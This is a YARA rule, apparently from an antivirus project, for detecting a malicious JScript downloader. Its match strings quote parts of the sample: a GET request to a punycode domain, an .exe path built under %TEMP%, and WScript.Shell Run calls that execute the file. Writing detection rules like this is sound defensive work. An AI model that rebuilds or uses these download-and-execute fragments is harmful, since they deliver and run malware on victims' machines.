rule sig_20160329_253f80cf23c5a884912c130121c57c2b {
  meta:
    description = "datamaliciousorder - file 20160329_253f80cf23c5a884912c130121c57c2b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0fe50b73e6c983522ffbae7223e02eec188d9def9dd49cfe8fcb51bb8d514be5"

  strings:
    $s1  = "V[c](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function g() {return E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OBDRqdBwviY.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[G](yf() * 11); if (V[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var E = function mZ() {return WScript[Pe](\"WScript.Shell\");}(), u1 = 11;" fullword ascii
    $s5  = "function YW(BU, Q){O = O * 1; return BU - Q;};" fullword ascii
    $s6  = "function Vr(){return \"\" + NJ;};" fullword ascii
    $s7  = "function Jz() {return ((x == true) && (x == W)) ? 1 : O;};" fullword ascii
    $s8  = "function qq(yr){E[\"Run\"](yr, O, O);};" fullword ascii
    $s9  = " while (z){" fullword ascii
    $s10 = "function wU()" fullword ascii
    $s11 = "function yf(){return 22;};" fullword ascii
    $s12 = "var U0 = new this[\"Date\"]();" fullword ascii
    $s13 = "return YW(i, D);" fullword ascii
    $s14 = "function sE(ar) {var s = (1, 2, 3, 4, 5, ar); return s;};" fullword ascii
    $s15 = "function U(){return Pe;};" fullword ascii
    $s16 = "var W = false;" fullword ascii
    $s17 = "W = true; " fullword ascii
    $s18 = "x = true; " fullword ascii
    $s19 = "var Bc = false;" fullword ascii
    $s20 = "var x = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}